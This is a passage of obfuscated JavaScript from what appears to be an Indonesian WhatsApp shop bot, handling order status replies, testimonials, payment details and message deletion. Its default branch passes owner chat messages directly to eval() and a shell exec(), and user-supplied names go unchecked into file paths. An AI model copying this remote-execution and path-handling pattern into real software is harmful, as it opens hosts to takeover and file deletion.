          let _0x28579e = "「 *TRANSAKSI PENDING* 」\n\n```📆 TANGGAL : @tanggal\n⌚ JAM     : @jam\n✨ STATUS  : Pending```\n\n📝 Catatan :\n@pesanan\n\nPesanan @user sedang di proses!";
          const _0x2dcbc7 = getTextSetProses(_0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x583dfd);
          if (_0x2dcbc7 !== undefined) {
            var _0x23e530 = _0x2dcbc7.replace("@pesanan", _0x528d2a ? _0x528d2a : "-").replace("@user", "@" + _0x4611fa.quoted.sender.split("@")[0]).replace("@jam", _0x59431e).replace("@tanggal", vF6(new Date())).replace("@user", "@" + _0x4611fa.quoted.sender.split("@")[0]);
            _0x221ba4.sendTextWithMentions(_0x4611fa.chat, _0x23e530, _0x4611fa);
          } else {
            _0x221ba4.sendTextWithMentions(_0x4611fa.chat, _0x28579e.replace("@pesanan", _0x528d2a ? _0x528d2a : "-").replace("@user", "@" + _0x4611fa.quoted.sender.split("@")[0]).replace("@jam", _0x59431e).replace("@tanggal", vF6(new Date())).replace("@user", "@" + _0x4611fa.quoted.sender.split("@")[0]), _0x4611fa);
          }
        }
        break;
      case "d":
      case "done":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x4611fa.quoted) {
            return _0x4611fa.reply("Reply pesanan yang telah di proses");
          }
          let _0x3a9023 = _0x4611fa.quoted ? _0x3af358.text : _0x3af358.text.split(_0x18d0e5[0])[1];
          let _0x169811 = "「 *TRANSAKSI BERHASIL* 」\n\n```📆 TANGGAL : @tanggal\n⌚ JAM     : @jam\n✨ STATUS  : Berhasil```\n\nTerimakasih @user Next Order ya🙏";
          const _0x34282e = getTextSetDone(_0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x1ae4d0);
          if (_0x34282e !== undefined) {
            var _0x23e530 = _0x34282e.replace("@pesanan", _0x3a9023 ? _0x3a9023 : "-").replace("@user", "@" + _0x4611fa.quoted.sender.split("@")[0]).replace("@jam", _0x59431e).replace("@tanggal", vF6(new Date())).replace("@user", "@" + _0x4611fa.quoted.sender.split("@")[0]);
            _0x221ba4.sendTextWithMentions(_0x4611fa.chat, _0x23e530, _0x4611fa);
          } else {
            _0x221ba4.sendTextWithMentions(_0x4611fa.chat, _0x169811.replace("@pesanan", _0x3a9023 ? _0x3a9023 : "-").replace("@user", "@" + _0x4611fa.quoted.sender.split("@")[0]).replace("@jam", _0x59431e).replace("@tanggal", vF6(new Date())).replace("@user", "@" + _0x4611fa.quoted.sender.split("@")[0]), _0x4611fa);
          }
        }
        break;
      case "addtesti":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.owner);
          }
          if (_0x18d0e5.length < 1) {
            return _0x1d3510("Apa nama testinya?");
          }
          if (_0xaf1ce6.includes(q)) {
            return _0x1d3510("Nama tersebut sudah digunakan");
          }
          let _0x3419cf = await _0x221ba4.downloadAndSaveMediaMessage(_0x3af358);
          _0xaf1ce6.push(q);
          await fsExtra.copy(_0x3419cf, "./database/dareen/" + q + ".jpg");
          fs3.writeFileSync("./database/testimoni.json", JSON.stringify(_0xaf1ce6));
          fs3.unlinkSync(_0x3419cf);
          _0x1d3510("Sukses Menambakan Testimoni\nCek Dengan Mengetik " + _0x137417 + "testimoni");
        }
        break;
      case "deltesti":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.owner);
          }
          if (_0x18d0e5.length < 1) {
            return _0x1d3510("Masukkan nama gambar");
          }
          if (!_0xaf1ce6.includes(q)) {
            return _0x1d3510("Namanya tidak ada di database");
          }
          let _0x2ba718 = _0xaf1ce6.indexOf(q);
          _0xaf1ce6.splice(_0x2ba718, 1);
          fs3.writeFileSync("./database/testimoni.json", JSON.stringify(_0xaf1ce6));
          fs3.unlinkSync("./database/dareen/" + q + ".jpg");
          _0x1d3510("Sukses Delete Testi " + q);
        }
        break;
      case "testimoni":
        {
          let _0x357cfe = "┌──⭓「 *testi List* 」\n│\n";
          for (let _0x1e2864 of _0xaf1ce6) {
            _0x357cfe += "│⭔ " + _0x1e2864 + "\n";
          }
          _0x357cfe += "│\n└────────────⭓\n\n*Totally there are : " + _0xaf1ce6.length + "*";
          _0x1d3510(_0x357cfe);
        }
        break;
      case "donasi":
        {
          const _0x95aa31 = global.ownerNumber + "@s.whatsapp.net";
          let _0x367815 = "*-------「 DONASI BY Dáreen Albérich𓆰⸸𓆪 」 -------*\n\nUNTUK QRIS SILAHKAN SCAN FOTO DI ATAS\n\nDANA : 083169231840\nOVO : 083169231840\nGOPAY : 083169231840\n\n*KETIK .proses AGAR PESANAN ANDA LANGSUNG*\n*KAMI PROSES*";
          const _0x53b066 = {
            quoted: _0x4611fa
          };
          _0x221ba4.sendMessage(_0x1dd769, {
            image: {
              url: "https://telegra.ph/file/34b0c1061097900bffd29.jpg"
            },
            caption: "" + _0x367815
          }, _0x53b066);
        }
        break;
      case "payment":
        {
          const _0x164868 = global.ownerNumber + "@s.whatsapp.net";
          let _0x448f4a = "*-------「 PAYMENT BY Dáreen Albérich𓆰⸸𓆪 」 -------*\n\nUNTUK QRIS SILAHKAN SCAN FOTO DI ATAS\n\nDANA : " + dana + "\nOVO : " + gopay + "\nGOPAY : " + ovo + "\nSHOPEEPAY : " + shp + "\n\n*KETIK .proses AGAR PESANAN ANDA LANGSUNG*\n*KAMI PROSES*";
          const _0x85039f = {
            quoted: _0x4611fa
          };
          _0x221ba4.sendMessage(_0x1dd769, {
            image: qris,
            caption: "" + _0x448f4a
          }, _0x85039f);
        }
        break;
      case "tunda":
        {
          const _0x429a09 = "*TRANSAKSI MENGALAMI PENDING*\n\n\n𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚\n𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥\n\n*AKAN KAMI PROSES SEGERA*";
          _0x1d3510(_0x429a09);
        }
        break;
      case "batal":
        {
          const _0x42a2d1 = "*TRANSAKSI DI BATALKAN*\n\n📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: " + vF6 + "\n🕰️ 𝗪𝗮𝗸𝘁𝘂: " + jam + "\n✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal\n\n𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹\n";
          _0x1d3510(_0x42a2d1);
        }
        break;
      case "del":
      case "delete":
        {
          if (_0x2ec274) {
            if (!_0x1220c9 && !_0x13697b) {
              return _0x4611fa.reply(msg.admin);
            }
            if (!_0x4611fa.quoted) {
              return _0x4611fa.reply("Reply Pesan Yang Ingin Di Hapus");
            }
            if (_0x4611fa.quoted.sender == _0x27d4a1) {
              _0x221ba4.sendMessage(_0x4611fa.chat, {
                delete: {
                  remoteJid: _0x4611fa.chat,
                  fromMe: true,
                  id: _0x4611fa.quoted.id,
                  participant: _0x4611fa.quoted.sender
                }
              });
            } else {
              if (!_0x3c8260) {
                return _0x4611fa.reply(msg.adminbot);
              }
              _0x221ba4.sendMessage(_0x4611fa.chat, {
                delete: {
                  remoteJid: _0x4611fa.chat,
                  fromMe: false,
                  id: _0x4611fa.quoted.id,
                  participant: _0x4611fa.quoted.sender
                }
              });
            }
          } else {
            if (!_0x1220c9) {
              return _0x4611fa.reply(msg.owner);
            }
            if (!_0x4611fa.quoted) {
              return _0x4611fa.reply("Reply Pesan Yang Ingin Di Hapus");
            }
            _0x221ba4.sendMessage(_0x4611fa.chat, {
              delete: {
                remoteJid: _0x4611fa.chat,
                fromMe: false,
                id: _0x4611fa.quoted.id,
                participant: _0x4611fa.quoted.sender
              }
            });
          }
        }
        break;
      default:
        if (_0x24e006.startsWith("=>")) {
          if (!_0x1220c9) {
            return false;
          }
          function _0x40dee0(_0x26d421) {
            sat = JSON.stringify(_0x26d421, null, 2);
            bang = util2.format(sat);
            if (sat == undefined) {
              bang = util2.format(_0x26d421);
            }
            return _0x1d3510(bang);
          }
          try {
            _0x1d3510(util2.format(eval("(async () => { return " + _0x24e006.slice(3) + " })()")));
          } catch (_0x792507) {
            _0x1d3510(String(_0x792507));
          }
        }
        if (_0x24e006.startsWith(">")) {
          if (!_0x1220c9) {
            return false;
          }
          try {
            let _0x362b6d = await eval(_0x24e006.slice(2));
            if (typeof _0x362b6d !== "string") {
              _0x362b6d = require("util").inspect(_0x362b6d);
            }
            await _0x1d3510(_0x362b6d);
          } catch (_0x3a3dd3) {
            await _0x1d3510(String(_0x3a3dd3));
          }
        }
        if (_0x24e006.startsWith("$")) {
          if (!_0x1220c9) {
            return false;
          }
          exec(_0x24e006.slice(2), (_0x5ccf5c, _0xe363d5) => {
            if (_0x5ccf5c) {
              return _0x1d3510(_0x5ccf5c);
            }
            if (_0xe363d5) {
              return _0x1d3510(_0xe363d5);
            }
          });
        }
        if (_0x24e006.match && ["anj", "ngentod", "anjg", " kontol", "asu"].includes(_0x24e006) && !_0x495ba4) {
          _0x1d3510("*Dont Toxic*");
        }
        if (_0x495ba4 && _0x24e006.toLowerCase() != undefined) {
          if (_0x1dd769.endsWith("broadcast")) {
            return;
          }
          if (_0x4611fa.isBaileys) {
            return;
          }
          let _0x59cb84 = global.db.data.database;
          if (!(_0x24e006.toLowerCase() in _0x59cb84)) {
            return;
          }
          _0x221ba4.copyNForward(_0x1dd769, _0x59cb84[_0x24e006.toLowerCase()], true);
        }
    }
  } catch (_0x358be8) {
    _0x4611fa.reply(util2.format(_0x358be8));
  }
};
let v1226 = require.resolve(__filename);
fs3.watchFile(v1226, () => {
  fs3.unwatchFile(v1226);
  console.log(chalk2.redBright("Update " + __filename));
  delete require.cache[v1226];
  require(v1226);
});